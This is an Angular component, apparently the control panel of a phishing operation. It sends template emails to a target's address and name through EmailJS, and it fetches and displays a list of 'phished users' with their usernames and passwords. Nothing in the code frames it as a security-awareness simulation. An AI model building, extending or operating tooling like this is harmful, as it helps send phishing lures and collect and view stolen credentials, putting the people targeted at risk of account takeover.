import {Component, OnInit} from '@angular/core';
import {FormControl, FormGroup, ReactiveFormsModule, Validators} from "@angular/forms";
import {JsonPipe, NgIf} from "@angular/common";
import {environment} from "../../../environments/environment";
import {HttpClient, HttpClientModule} from "@angular/common/http";
declare const emailjs: any;


@Component({
  selector: 'app-phishing',
  standalone: true,
  imports: [
    ReactiveFormsModule,
    NgIf,
    HttpClientModule,
    JsonPipe
  ],
  templateUrl: './phishing.component.html',
  styleUrl: './phishing.component.css'
})
export class PhishingComponent implements OnInit {
  form = new FormGroup({
    email: new FormControl(null, [Validators.required, Validators.email]),
    userName: new FormControl(null, Validators.required)
  })
  isSent = false

  get email() {return this.form.get('email') as FormControl}
  get userName() {return this.form.get('userName') as FormControl}

  enteredEmail?: string
  enteredUsername?: string
  phishedUsers: {username: string, password: string}[] = []

  constructor(private http: HttpClient) {
  }

  async ngOnInit() {
    await this.getPhishedUsers()
  }

  async getPhishedUsers() {
    return this.http.get(`${environment.apiUrl}/users.json`).toPromise().then((data: any)=> {
      this.phishedUsers = data
    })
  }

  sendEmail() {
    if (this.form.invalid) return

    const params = {to_name: this.userName.value, email: this.email.value,}
    const {EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID} = environment

    emailjs.send(EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID, params)
    this.isSent = true
    this.enteredEmail = this.email.value
    this.enteredUsername = this.userName.value
    this.form.reset()
  }
}
